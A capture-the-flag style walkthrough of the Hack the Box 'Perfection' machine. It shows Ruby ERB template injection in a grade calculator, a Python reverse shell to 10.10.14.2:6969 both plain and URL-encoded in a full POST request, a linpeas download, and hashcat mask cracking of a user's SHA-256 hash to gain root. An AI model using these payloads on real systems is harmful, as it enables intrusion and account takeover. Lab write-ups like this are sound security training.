+++
author = "Nick"
categories = ["hack the box", "easy"]
date = 2024-07-06T11:00:00.000Z
publishDate = 2024-07-06T11:00:00.000Z
description = "Weclome to Perfection!"
summary = "An easy Linux machine leveraging SSTI and Hashcat to escalate to root!"
draft = false
slug = "hack-the-box-perfection"
tags = ["hack the box", "Easy", "Linux", "hashcat", "burpsuite", "RCE", "SSTI", "Ruby"]
title = "Hack the Box - Perfection"
url = "/hack-the-box-perfection"
thumbnail = "/images/perfection/logo.png"
+++

Welcome to perfection! This is a `Hack the Box` machine with a listed difficulty of `easy`. It's a `Linux` machine so let's see what this machine has in store.

As we do, every. single. time. we enumarate, we start with a `rustscan` of the target.

`rustscan -a 10.129.229.121 -- -A`

Our results are the following:
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx
|_http-title: Weighted Grade Calculator
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Well, we see a pretty basic port interface. We can launch `Burpsuite` and see what's being hosted on port `80`. When we land at the site, we see, as the port defined, a Weighted Grade Calculator.

![](/images/perfection/perf1.png)

Scrolling through, we see it's being powered by `WEBrick 1.7.0`. A quick Google for that service and version shows we have some [vulnerabilities here](https://www.exploit-db.com/exploits/5215). We can keep this in our backpocket and continue to explore the app. 

![](/images/perfection/perf2.png)

We see that we can supply some values and get assumably a weighted grade back. So we can take this request and send it over to `repeater` in `Burpsuite` and see what we can find.

![](/images/perfection/perf3.png)

When we tamper with the parameters of the request, we see that some things are being blocked:

![](/images/perfection/perf4.png)

When we send some `URL Encoded` commands we get back an `invalid %-encoding` error. So now we know we need to leverage a 'standard' `URL Encoding` method. We know that our base framework is build on `Ruby` - particularly `WEBRick`. Knowing this can then look at how `SSTI` payloads [look for](https://www.trustedsec.com/blog/rubyerb-template-injection) [the](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) [language](https://github.com/harsh-bothra/SecurityExplained/blob/main/resources/ruby-erb-ssti.md). After some poking back and forth with different template methods, we see that `<% ACTION %>` works but only if we `URL encode` it AND `URL encode` the new line character **BEFORE** the template.

![](/images/perfection/perf5.png)

So, now we have a working `SSTI` payload, we just need to weaponize it.

```
test73%0a<%25%3d+7*7+%25>
```

In `Ruby` you can capture the output of commands within code by leveraging the `backtick`. So we can take our payload of `test73%0a<%25%3d+`ls`+%25>` and we should get output of the command:


![](/images/perfection/perf6.png)

Great! Now let's see what `main.rb` holds, and also, let's get a shell!

```
require 'sinatra'
require 'erb'
set :show_exceptions, false

configure do
    set :bind, '127.0.0.1'
    set :port, '3000'
end

get '/' do
    index_page = ERB.new(File.read 'views/index.erb')
    response_html = index_page.result(binding)
    return response_html
end

get '/about' do
    about_page = ERB.new(File.read 'views/about.erb')
    about_html = about_page.result(binding)
    return about_html
end

get '/weighted-grade' do
    calculator_page = ERB.new(File.read 'views/weighted_grade.erb')
    calcpage_html = calculator_page.result(binding)
    return calcpage_html
end

post '/weighted-grade-calc' do
    total_weight = params[:weight1].to_i + params[:weight2].to_i + params[:weight3].to_i + params[:weight4].to_i + params[:weight5].to_i
    if total_weight != 100
        @result = "Please reenter! Weights do not add up to 100."
        erb :'weighted_grade_results'
    elsif params[:category1] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category2] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category3] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category4] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category5] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:grade1] =~ /^(?:100|\d{1,2})$/ && params[:grade2] =~ /^(?:100|\d{1,2})$/ && params[:grade3] =~ /^(?:100|\d{1,2})$/ && params[:grade4] =~ /^(?:100|\d{1,2})$/ && params[:grade5] =~ /^(?:100|\d{1,2})$/ && params[:weight1] =~ /^(?:100|\d{1,2})$/ && params[:weight2] =~ /^(?:100|\d{1,2})$/ && params[:weight3] =~ /^(?:100|\d{1,2})$/ && params[:weight4] =~ /^(?:100|\d{1,2})$/ && params[:weight5] =~ /^(?:100|\d{1,2})$/
        @result = ERB.new("Your total grade is <%= ((params[:grade1].to_i * params[:weight1].to_i) + (params[:grade2].to_i * params[:weight2].to_i) + (params[:grade3].to_i * params[:weight3].to_i) + (params[:grade4].to_i * params[:weight4].to_i) + (params[:grade5].to_i * params[:weight5].to_i)) / 100 %>\%<p>" + params[:category1] + ": <%= (params[:grade1].to_i * params[:weight1].to_i) / 100 %>\%</p><p>" + params[:category2] + ": <%= (params[:grade2].to_i * params[:weight2].to_i) / 100 %>\%</p><p>" + params[:category3] + ": <%= (params[:grade3].to_i * params[:weight3].to_i) / 100 %>\%</p><p>" + params[:category4] + ": <%= (params[:grade4].to_i * params[:weight4].to_i) / 100 %>\%</p><p>" + params[:category5] + ": <%= (params[:grade5].to_i * params[:weight5].to_i) / 100 %>\%</p>").result(binding)
        erb :'weighted_grade_results'
    else
        @result = "Malicious input blocked"
        erb :'weighted_grade_results'
    end
end
```

We can see the flaw above. The line `@result = ERB.new("Your total grade ... ").result(binding)` directly executes a string of Ruby code constructed from user input. Oops! Sanatize your inputs!

Some further enumeration including `which python`, `which ruby` and some others we can simply craft a quick `reverse shell` and catch it.

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`

The above shell needs to be `URL Encoded` as well. So this was our final request sent:

```
POST /weighted-grade-calc HTTP/1.1

Host: 10.129.229.121

Content-Length: 267

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://10.129.229.121

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://10.129.229.121/weighted-grade-calc

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close



category1=test73%0a<%25%3d+`%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%30%2e%31%30%2e%31%34%2e%32%22%2c%36%39%36%39%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%69%6d%70%6f%72%74%20%70%74%79%3b%20%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29%27`%25>&grade1=1&weight1=20&category2=vulns&grade2=2&weight2=20&category3=pwns&grade3=3&weight3=60&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0
```

Now, we had our listener running on `6969` and we caught the call!

![](/images/perfection/perf7.png)

We then head over to `/home/susan/` and snag our `user.txt`!


![](/images/perfection/perf8.png)

Great, now with a shell on the system we can look to escalate our session. We stabalize our shell and start to look for a way to escalate. We start to manually sift around and find a `pupilpath_credentials.db` file. We can give it a quick `cat` and see its some username / password action:

```
��^�ableusersusersCREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
a�\
Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023fs
```

We'll put a pin in this info and come back, as we could use it later. We transfer over `linpeas` to the `/tmp` directory and give it a run.

Host our web server:
`python3 -m http.server 80`

On our compromised system:
`wget http://10.10.14.2/lp.sh`
`chmod +x lp.sh`
`./lp.sh`

We let `linpeas` run and sift through all the information there, as usual - a lot isn't actionable - one thing that is, is that `susan` can leverage `sudo` with no password since she is in group `27`. This is only useful if we have her password to start with, since it's required to `sudo` and currently, `sudo -l` gives us nothing. We also see at the very end of the `linpeas` ouput we see some mail in the `/var/mail` directory:

![](/images/perfection/perf9.png)

When we view the contents of the file we get the following message:

```
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

Great. So now we know the password scheme. This helps line up what we see from the previous db file we found.

Now we'll stick our `hash` from the `pupilpath_credentials.db` file, and put it into a new file called `hash.txt`.

`echo abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f`

Next we can check the type of hash it is with `hashid`.

`hashid hash.txt -m`

This gives us an output for `hashcat` mode:

```
--File 'hash.txt'--
Analyzing 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f'
[+] Snefru-256 
[+] SHA-256 [Hashcat Mode: 1400]
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 [Hashcat Mode: 6900]
[+] GOST CryptoPro S-Box 
[+] SHA3-256 [Hashcat Mode: 5000]
[+] Skein-256 
[+] Skein-512(256) 
--End of file 'hash.txt'--%   
```

We see that we have `1400`, `6900` and `5000`. Starting at the top makes perfect sense given how common it is. Now, the next thing we need to do, is setup `hashcat` to understand the password policy that was created. Now, Hack the Box has an **EXCELLENT** Academy module on this called `Cracking Passwords with Hashcat` and I would highly recommend it. So from that module, is this nice cheat sheat about `Maske Attack` functionality. 

![](/images/perfection/perf10.png)

As you can see from the above sheet, we can leverage `?d` to represent a digit from 0-9. So now we know our format is going to be `{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}` which for us is now:

`susan_nasus_{digits}`

So here's how we string it all together with `hashcat`

We leverage `-a 3` for our attack mode being set to `mask attack`.
We use `-m 1400` as our `hash id` of `SHA-256`.
We supply our format of `susan_nasus_?d?d?d?d?d?d?d?d?d` to set the potential digit length of up to 1 million.

Total command:
`hashcat -m 1400 hash.txt -a 3 'susan_nasus_?d?d?d?d?d?d?d?d?d'`

This can take a while to run if you're running on a potato VM without properly optomizing `hashcat` options. (Like me :) ) 

Eventually it finishes and we get our cracked password:

![](/images/perfection/perf11.png)

Now we can try the password of `susan_nasus_413759210` and see if it let's us `sudo`.

We do a quick `sudo su` enter the password and we are in!

![](/images/perfection/root.png)

There we have it, another box down!